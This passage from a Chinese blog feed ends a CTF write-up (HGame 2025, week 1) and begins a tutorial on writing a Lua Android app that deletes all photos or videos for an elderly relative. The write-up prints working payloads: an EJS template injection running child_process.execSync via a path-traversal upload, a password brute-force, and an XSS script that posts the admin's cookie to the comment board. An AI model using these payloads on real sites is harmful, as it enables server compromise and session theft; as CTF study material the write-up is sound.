&#123;</span><br><span class="line">                dexClassLoader = <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(</span><br><span class="line">                        dexFile.getAbsolutePath(),</span><br><span class="line">                        dexDir.getAbsolutePath(),</span><br><span class="line">                        <span class="literal">null</span>,</span><br><span class="line">                        context.getClassLoader()</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cleanup</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (dexFile != <span class="literal">null</span> &amp;&amp; dexFile.exists()) &#123;</span><br><span class="line">            dexFile.delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">callDexMethod</span><span class="params">(String className, String methodName, Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (dexClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;DexClassLoader not initialized. Call init() first.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; targetClass = dexClassLoader.loadClass(className);</span><br><span class="line">            Constructor&lt;?&gt; constructor = targetClass.getConstructor();</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> targetClass.getMethod(methodName, input.getClass());</span><br><span class="line">            <span class="keyword">return</span> targetMethod.invoke(instance, input);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main里爆</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> DexCall.init(<span class="built_in">this</span>,<span class="string">&quot;zunjia.dex&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">1</span>; length &lt; <span class="number">13</span>; length++) &#123;</span><br><span class="line">       </span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; (<span class="type">int</span>) Math.pow(<span class="number">2</span>, length); i++) &#123;</span><br><span class="line">          </span><br><span class="line">               <span class="type">String</span> <span class="variable">binaryStr</span> <span class="operator">=</span> Integer.toBinaryString(i);</span><br><span class="line">           </span><br><span class="line">               <span class="keyword">while</span> (binaryStr.length() &lt; length) &#123;</span><br><span class="line">                   binaryStr = <span class="string">&quot;0&quot;</span> + binaryStr;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="type">String</span> <span class="variable">abStr</span> <span class="operator">=</span> binaryStr.replace(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;0.o&quot;</span>).replace(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;o.0&quot;</span>);</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (superEncode(abStr).contains(<span class="string">&quot;hgame&quot;</span>)) &#123;</span><br><span class="line">                   Log.d(<span class="string">&quot;-----------------&quot;</span>,superEncode(abStr));</span><br><span class="line">                   Log.d(<span class="string">&quot;000000000000000000000&quot;</span>,abStr);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">superEncode</span><span class="params">(String s)</span> &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> (String) DexCall.callDexMethod( <span class="string">&quot;com.nobody.zundujiadu&quot;</span>, <span class="string">&quot;encode&quot;</span>, s);</span><br><span class="line">       List&lt;Integer&gt; keys = Encoder.enkeys(a); <span class="comment">// 调用 Encoder.enkeys</span></span><br><span class="line">       List&lt;Integer&gt; input_string = Arrays.asList(<span class="number">0x7A</span>, <span class="number">0xC7</span>, <span class="number">0xC7</span>, <span class="number">0x94</span>, <span class="number">0x51</span>, <span class="number">0x82</span>, <span class="number">0xF5</span>, <span class="number">0x99</span>, <span class="number">0x0C</span>, <span class="number">0x30</span>, <span class="number">0xC8</span>, <span class="number">0xCD</span>, <span class="number">0x97</span>, <span class="number">0xFE</span>, <span class="number">0x3D</span>, <span class="number">0xD2</span>, <span class="number">0xAE</span>, <span class="number">0x0E</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x87</span>, <span class="number">0xBB</span>, <span class="number">0xC6</span>, <span class="number">0x35</span>, <span class="number">0xE1</span>, <span class="number">0x8C</span>, <span class="number">0x59</span>, <span class="number">0xEF</span>, <span class="number">0xAD</span>, <span class="number">0xFA</span>, <span class="number">0x94</span>, <span class="number">0x74</span>, <span class="number">0xD3</span>, <span class="number">0x42</span>, <span class="number">0x27</span>, <span class="number">0x98</span>, <span class="number">0x77</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x46</span>, <span class="number">0x5E</span>, <span class="number">0x95</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span>  <span class="title class_">String</span>(Encoder.encode(input_string, keys)); <span class="comment">// 调用 Encoder.encode</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行一次app，然后在log里即可看到flag</p><p><img src="hgame-wp-week1.assets%5Cfc3c4ca1c6950827fb261c6f4e5bfcd9-20250206145442-pgqsdju.png" alt="fc3c4ca1c6950827fb261c6f4e5bfcd9">​</p><p>当然优化的dexcall函数让dex就解密了在私有路径下/data/user/0/com.nobody.zunjia/cache/dex/zunjia.dex</p><p>也就可以自己实现他的算法爆破了。</p><h2 id="WEB">WEB</h2><h3 id="Level-24-Pacman">&gt; Level 24 Pacman</h3><p>控制台改分</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/score.png" alt="image-20250206174256238"></p><p>游戏结束得到base64编码</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/base64.png" alt="image-20250206174349691"></p><p>base64解码 + 栅栏2栏 得到flag</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/enc.png" alt="image-20250206174552723"></p><h3 id="Level-47-BandBomb">&gt; Level 47 BandBomb</h3><p>文件上传，分析下js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>multer默认情况下会保留原始文件名，可能存在路径遍历漏洞，导致文件被上传到其他目录</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br></pre></td></tr></table></figure><p>上传的文件被当作EJS模板渲染的话，会有模板注入漏洞</p><p>所以攻击思路为：上传一个包含恶意代码的EJS文件，通过向/rename发post改名，通过路径遍历改到views目录，访问目标网站</p><p>exp.ejs：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= </span><br><span class="line">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/upload.png" alt="image-20250210113420068"></p><p>发送post</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/post.png" alt="image-20250210113607578"></p><p>刷新网页，得到flag</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/webflag.png" alt="image-20250210113645630"></p><h3 id="Level-69-MysteryMessageBoard">&gt; Level 69 MysteryMessageBoard</h3><p>根据提示，爆出admin session并替换，访问/flag即可得到flag</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/tip.png" alt="image-20250206175054048"></p><p>bp抓包，Sniper爆破得到密码为 <code>888888</code></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/pre.png" alt="image-20250206180344181"></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/888888.png" alt="image-20250206180428694"></p><p>发现留言框有xss漏洞</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/xss_test.png" alt="image-20250206180652296"></p><p>使用Fetch API来发送cookie</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/comments/new&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="string">&#x27;comment=Admin+Cookie:+&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Cookie Sent!&#x27;</span>));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>提交评论，刷新后出现了自己的cookie，但是需要admin的cookie</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/self_cookie.png" alt="image-20250206181722012"></p><p>访问 <code>/admin</code>，提示 <code>admin</code> 访问了留言板，得到 admin cookie</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/admin.png" alt="image-20250206181824997"></p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/admin-cookie.png" alt="image-20250206181905337"></p><p>修改自身cookie，访问 <code>/flag</code> ，得到flag</p><p><img src="/assets/post_img/ctf/HGameCTF2025week1/web2flag.png" alt="image-20250206182005015"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓环境下Lua安卓开发初体验</title>
      <link href="/posts/cd2fe6a3.html"/>
      <url>/posts/cd2fe6a3.html</url>
      
        <content type="html"><![CDATA[<h1>安卓环境下Lua安卓开发初体验</h1><blockquote><p>家里老人年纪大了，记不住手机怎么操作，两天问了五遍怎么全删图片，遂尝试安卓开发，一键清空图片/视频。一开始尝试 Java，虽然有过 Java 学习经验，但短时间上手安卓实在头大，选择了更简单灵活的Lua</p></blockquote><p>推荐阅读：<a href="https://doc.kulipai.top/posts/10%E5%88%86%E9%92%9F%E7%94%A8%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%BC%80%E5%8F%91%E5%AE%89%E5%8D%93.html">10分钟用安卓手机开发安卓</a></p><h2 id="环境">环境</h2><p><strong>工具</strong>：NeLuaJ+，可选 MT 管理器，一个好用的ai(ds，copilot…)</p><p><strong>环境</strong>：安卓</p><p><strong>所有用到的工具和成果  蓝奏云</strong>：<a href="https://wwre.lanzouq.com/b0ul17nve">https://wwre.lanzouq.com/b0ul17nve</a>  密码:8rqk</p><p>NeLuaJ+ Builder为配套构建工具，NeLuaJ+为编写工具</p><p><strong>目标安卓版本</strong>：安卓9 &amp; 安卓12</p><h2 id="创建项目">创建项目</h2><p>进入 NeLuaJ+ ，右上角 <code>竖着的三个点</code> 选择 <code>项目...</code> → <code>创建项目</code></p><p><img src="/assets/post_img/dev/%E5%AE%89%E5%8D%93%E7%8E%AF%E5%A2%83%E4%B8%8BLua%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E5%88%9D%E4%BD%93%E9%AA%8C/Screenshot_20250209_085812.jpg" alt="Screenshot_20250209_085812"></p><p>根据需要修改软件名称和包名，选择需要的模块。以 <code>一键清空图片/视频</code> 为例，修改名字后直接创建</p><p>起名为 <code>imgCleaner</code> ，右上角 <code>横着的三条杠</code> 下进入根目录 <code>/storage/emulated/0/LuaJ/Project/imgCleaner/</code></p><p>下文所有 <code>./</code> 即为 <code>/storage/emulated/0/LuaJ/Project/imgCleaner/</code>，也就是项目根目录下</p><p><img src="/assets/post_img/dev/%E5%AE%89%E5%8D%93%E7%8E%AF%E5%A2%83%E4%B8%8BLua%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E5%88%9D%E4%BD%93%E9%AA%8C/image-20250209091439376.png" alt="image-20250209091439376"></p><h2 id="编写布局">编写布局</h2><p>预期效果为：两个按钮，一个一键删掉图片，一个一键删掉视频</p><p>先创建两个按钮(Button)，进入 <code>./res/layout/main.lua</code> ，这里编写布局</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;  </span><br><span class="line">  LinearLayout,  <span class="comment">--线性布局</span></span><br><span class="line">  orientation=<span class="string">&quot;vertical&quot;</span>,  <span class="comment">--竖向排列</span></span><br><span class="line">  layout_width=<span class="string">&quot;match&quot;</span>,  <span class="comment">--宽度最大</span></span><br><span class="line">  layout_height=<span class="string">&quot;match&quot;</span>,  <span class="comment">--高度最大</span></span><br><span class="line">  gravity=<span class="string">&quot;center&quot;</span>,  <span class="comment">--子空间居中</span></span><br><span class="line">  &#123;</span><br><span class="line">    AppCompatTextView, <span class="comment">--文本控件</span></span><br><span class="line">    text=<span class="string">&quot;Hello NeLuaJ+&quot;</span>, <span class="comment">--文字</span></span><br><span class="line">   &#125;,</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>默认提供了在屏幕正中央显示 <code>Hello NeLuaJ+</code> 的样例文字。编写过程中可以随时在 <code>屏幕正上方的黑色三角形</code> → <code>运行工程</code> 中测试软件。</p><p>删掉文本，添加两个Button控件</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import <span class="string">&quot;android.widget.*&quot;</span>, <span class="string">&quot;androidx.appcompat.widget.*&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  LinearLayout, <span class="comment">--线性布局</span></span><br><span class="line">  orientation=<span class="string">&quot;vertical&quot;</span>, <span class="comment">--竖向排列</span></span><br><span class="line">  layout_width=<span class="string">&quot;match&quot;</span>, <span class="comment">--宽度最大</span></span><br><span class="line">  layout_height=<span class="string">&quot;match&quot;</span>, <span class="comment">--高度最大</span></span><br><span class="line">  gravity=<span class="string">&quot;center&quot;</span>, <span class="comment">--子空间居中</span></span><br><span class="line">  &#123;</span><br><span class="line">    Button, <span class="comment">--按钮控件</span></span><br><span class="line">    text=<span class="string">&quot;清理图片&quot;</span>, <span class="comment">--按钮显示的文字(可选，没有text的话会显示没有文字的按钮)</span></span><br><span class="line">    id=<span class="string">&quot;imgclean&quot;</span>, <span class="comment">--按钮id，这个id是独一无二指向这个button，支持中文(不建议中文编程)</span></span><br><span class="line">    layout_width = <span class="string">&quot;200dp&quot;</span>, <span class="comment">--按钮宽度(可选)</span></span><br><span class="line">    layout_height = <span class="string">&quot;100dp&quot;</span>, <span class="comment">--按钮高度(可选)</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    Button,</span><br><span class="line">    text=<span class="string">&quot;清理视频&quot;</span>,</span><br><span class="line">    id=<span class="string">&quot;movclean&quot;</span>,</span><br><span class="line">    layout_width = <span class="string">&quot;200dp&quot;</span>,</span><br><span class="line">    layout_height = <span class="string">&quot;100dp&quot;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加好控件后尝试运行，成功显示两个按钮</p><p><img src="/assets/post_img/dev/%E5%AE%89%E5%8D%93%E7%8E%AF%E5%A2%83%E4%B8%8BLua%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E5%88%9D%E4%BD%93%E9%AA%8C/Screenshot_20250209_092427.jpg" alt="Screenshot_20250209_092427"></p><h2 id="编写逻辑">编写逻辑</h2><p>现在按钮没有功能，需要返回到 <code>./main.lua</code> 编写</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import <span class="string">&quot;java.lang.*&quot;</span>,<span class="string">&quot;java.util.*&quot;</span></span><br><span class="line">import <span class="string">&quot;android.os.*&quot;</span>,<span class="string">&quot;android.app.*&quot;</span></span><br><span class="line">import <span class="string">&quot;android.content.*&quot;</span>,<span class="string">&quot;android.provider.*&quot;</span></span><br><span class="line">activity &#123;</span><br><span class="line">  Title = res.<span class="built_in">string</span>.app_title,</span><br><span class="line">  ContentView = res.layout.main</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在默认提供的模板<strong>下方</strong>编写逻辑</p><p>首先编写两个按钮点击逻辑</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">imgclean.onClick=<span class="function"><span class="keyword">function</span><span class="params">()</span></span> <span class="comment">-- ButtonId.onClick=function() 为起始语句</span></span><br><span class="line">  deleteMedia(<span class="string">&quot;image&quot;</span>) <span class="comment">-- 调用函数，deleteMedia稍后编写</span></span><br><span class="line"><span class="keyword">end</span> <span class="comment">-- end为结束语句</span></span><br><span class="line"></span><br><span class="line">movclean.onClick=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">  deleteMedia(<span class="string">&quot;vedio&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>这段相对好理解，当按下对应id的按钮后，对应的事件为：调用deleteMedia()函数，传入一个参数(需要删除的文件类型)，然后end结束</p><p>下面编写 deleteMedia()，首先写个架子</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteMedia</span><span class="params">(type)</span></span></span><br><span class="line">  <span class="keyword">local</span> uri</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;image&quot;</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在清理图片&quot;</span>)</span><br><span class="line">    uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;vedio&quot;</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在清理视频&quot;</span>)</span><br><span class="line">    uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">        </span><br><span class="line">  ......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>type即为按钮传进来的参数，如果学过其他语言，这里type应该好理解，就是形参</p><p>对文件进行操作，需要知道文件在哪。安卓提供了 <code>访问共享存储空间中的媒体文件</code> 的方法</p><p><a href="https://developer.android.google.cn/training/data-storage/shared/media?hl=zh-cn#java">访问共享存储空间中的媒体文件</a></p><blockquote><p>科普</p><p>URI（Uniform Resource <strong>Identifier</strong>）统一资源标识符，<strong>一条用来标识抽象或物理资源的紧凑字符串，通过这个标识可以访问一个唯一的资源</strong><br>URL（Uniform Resource <strong>Locator</strong>）统一资源定位符</p></blockquote><p>访问媒体资源，可以通过 <code>MediaStore.media-type.Media.EXTERNAL_CONTENT_URI</code> 得到媒体资源uri</p><p>其中 <code>media-type</code> 就是媒体资源的类型</p><table><thead><tr><th>文件类型</th><th>media-type</th></tr></thead><tbody><tr><td>图片</td><td>Images</td></tr><tr><td>视频</td><td>Video</td></tr><tr><td>音频</td><td>Audio</td></tr><tr><td>下载的文件</td><td>Downloads</td></tr></tbody></table><p>以视频为例，视频的uri为 <code>MediaStore.Video.Media.EXTERNAL_CONTENT_URI</code></p><p>lua 定义变量参考 <a href="https://www.runoob.com/lua/lua-variables.html">Lua 变量</a></p><p>知道文件在哪(uri)了以后，就可以删除了。继续编写</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteMedia</span><span class="params">(type)</span></span></span><br><span class="line">  <span class="keyword">local</span> uri</span><br><span class="line">  <span class="keyword">local</span> Type</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;image&quot;</span> <span class="keyword">then</span></span><br><span class="line">    Type = <span class="string">&quot;图片&quot;</span></span><br><span class="line">    uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;vedio&quot;</span> <span class="keyword">then</span></span><br><span class="line">    Type = <span class="string">&quot;视频&quot;</span></span><br><span class="line">    uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">        </span><br><span class="line">  <span class="keyword">local</span> contentResolver = activity.getContentResolver() </span><br><span class="line">  <span class="keyword">local</span> rowsDeleted = contentResolver.delete(uri, <span class="literal">nil</span>, <span class="literal">nil</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">tostring</span>(rowsDeleted)..<span class="string">&quot;个&quot;</span>..Type..清理完成)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><code>local contentResolver = activity.getContentResolver()</code> 获得了当前活动的内容解析器（Content Resolver）。内容解析器是一个接口，提供对应用程序内数据的访问。</p><p><code>local rowsDeleted = contentResolver.delete(uri, nil, nil)</code>：使用内容解析器删除指定 URI 的数据。</p><p><code>Content Resolver</code> 的 <code>delete()</code> 函数有三个参数</p><p>原型：<code>delete(Uri uri,  String where, selectionArgs)</code></p><p>第一个参数为uri，第二三个参数为约束条件，返回被删除的行数，<code>nil</code> 表示没有选择条件</p><p>print内容为字符串，需要转换 <code>rowsDeleted</code> 类型，使用 <code>tostring()</code> 函数即可</p><p>在print内容中添加变量使用 <code>..</code>  （个人理解<code>..</code> 相当于 <code>+</code>）</p><p>主要逻辑便编写完成</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteMedia</span><span class="params">(type)</span></span></span><br><span class="line">  <span class="keyword">local</span> uri</span><br><span class="line">  <span class="keyword">local</span> Type</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;image&quot;</span> <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在清理图片&quot;</span>)</span><br><span class="line">    Type = <span class="string">&quot;图片&quot;</span></span><br><span class="line">    uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;vedio&quot;</span> <span class="keyword">then</span></span><br><span class="line">    <span class="comment">--print(&quot;正在清理视频&quot;)</span></span><br><span class="line">    Type = <span class="string">&quot;视频&quot;</span></span><br><span class="line">    uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">local</span> contentResolver = activity.getContentResolver()</span><br><span class="line">  <span class="keyword">local</span> rowsDeleted = contentResolver.delete(uri, <span class="literal">nil</span>, <span class="literal">nil</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">tostring</span>(rowsDeleted)..<span class="string">&quot;个&quot;</span>..Type..<span class="string">&quot;清理完毕&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">imgclean.onClick=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">  deleteMedia(<span class="string">&quot;image&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">movclean.onClick=<span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">  deleteMedia(<span class="string">&quot;vedio&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="权限申请">权限申请</h2><p>安卓历代文件保护可以看这篇文章 <a href="https://blog.csdn.net/m0_48179608/article/details/122838494">【安卓基础】一文搞懂Android历代版本文件访问权限变化</a></p><p><code>./init.lua</code> 中，有 <code>target_sdk</code>   <code>min_sdk</code>   <code>user_permission</code> 三个选项</p><p><code>target_sdk</code>   <code>min_sdk</code> 分别为目标sdk和最低sdk</p><blockquote><p>科普：SDK是什么</p><p>“SDK” 是 Software Development Kit 